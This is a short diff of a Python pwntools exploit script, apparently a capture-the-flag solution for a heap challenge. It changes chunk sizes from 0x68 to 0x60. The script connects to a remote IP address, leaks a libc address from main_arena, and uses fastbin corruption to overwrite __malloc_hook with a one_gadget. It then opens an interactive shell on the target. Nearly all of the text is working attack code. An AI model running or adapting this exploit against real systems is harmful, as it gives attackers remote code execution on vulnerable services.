@@ -26,8 +26,8 @@ def free(index):
 p = remote('45.76.173.177',6666)
 #context.log_level = 'debug'
 add(0x88,'')
-add(0x68,'')
-add(0x68,'')
+add(0x60,'')
+add(0x60,'')
 free(0)
 show(0)
 main_arena = u64(p.recv(6).ljust(8,'\x00')) - 88
@@ -38,10 +38,10 @@ free(2)
 free(1)
 malloc_hook = main_arena - 0x10
 one_gadget = libc_base + 0xD694F
-add(0x68,p64(malloc_hook - 0x23))
-add(0x68,'')
-add(0x68,'')
-add(0x68,'\x00'*19 + p64(one_gadget))
+add(0x60,p64(malloc_hook - 0x23))
+add(0x60,'')
+add(0x60,'')
+add(0x60,'\x00'*19 + p64(one_gadget))
 p.sendlineafter('choice>>','1')
 p.sendlineafter('Size:','16')
 p.interactive()
